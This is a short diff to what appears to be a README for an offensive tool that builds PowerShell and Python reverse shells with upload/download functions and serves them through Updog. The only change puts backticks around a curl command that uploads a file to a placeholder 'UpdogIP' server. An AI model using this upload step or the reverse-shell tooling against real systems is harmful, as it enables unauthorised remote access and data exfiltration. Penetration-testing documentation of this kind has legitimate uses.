@@ -17,7 +17,7 @@ Especially nice when in need of PowerShell and Python revshells, which can be a 
 - you can start/stop Updog from inside the script
 - The PowerShell revshells have upload/download function embedded
 - To upload from nix using curl: 
-curl -F path="absolute path for Updog-folder" -F file=filename http://UpdogIP/upload
+```curl -F path="absolute path for Updog-folder" -F file=filename http://UpdogIP/upload```
  
  
 ### To install
